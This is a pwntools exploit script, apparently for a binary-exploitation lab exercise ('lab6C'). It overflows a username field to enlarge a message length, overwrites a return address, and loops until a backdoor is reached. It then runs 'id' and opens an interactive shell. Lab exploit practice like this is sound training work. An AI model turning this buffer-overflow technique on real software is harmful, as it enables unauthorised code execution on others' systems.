#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386',kernel='amd64')
context.log_level = 'DEBUG'
exe = './lab6C'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()
username = fit({40:p8(0xff)}) #Overwrite message length

return_address = 0x565ca72b #Random ret address
tweet = fit({196:return_address})


# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
#io.sendline(username)
#io.sendline(tweet)
#io.interactive()
while True:
    try:
        io.sendline(username)
        io.sendline(tweet)
        io.recv()

        #Ghetto testing to see if backdoor was hit
        io.sendline('id')
        io.recv()
        io.interactive()
    except EOFError, e:
        print("EOF Error")
        io.kill()
        io = start()

